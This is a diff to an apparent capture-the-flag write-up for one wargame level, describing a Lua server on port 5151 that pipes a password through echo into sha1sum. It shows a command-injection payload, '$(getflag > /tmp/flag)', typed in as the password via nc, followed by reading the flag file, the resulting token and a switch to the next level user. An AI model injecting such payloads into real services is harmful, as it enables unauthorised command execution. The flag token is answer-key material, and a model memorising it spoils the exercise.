@@ -3,5 +3,8 @@ The lua file is a server asking for a password and comparing its sha1sum to : f0
 we get => `NotSoEasy`
 
 it doesn't work by imputing the password with ending /n so we can try ```echo -n NotSoEasy | nc localhost 5151``` => doesn't work
-command injection in the echo as previous flag with redirect to file because the output is piped to sha1sum : $(getflag > /tmp/flag)
-=> gives token : fa6v5ateaw21peobuub8ipe6s
+command injection in the echo as previous flag with redirect to file because the output is piped to sha1sum
+We launch the client with ```nc localhost 5151``` and input : $(getflag > /tmp/flag) as password
+=> ```cat /tmp/flag``` gives token : fa6v5ateaw21peobuub8ipe6s
+
+```su level12```
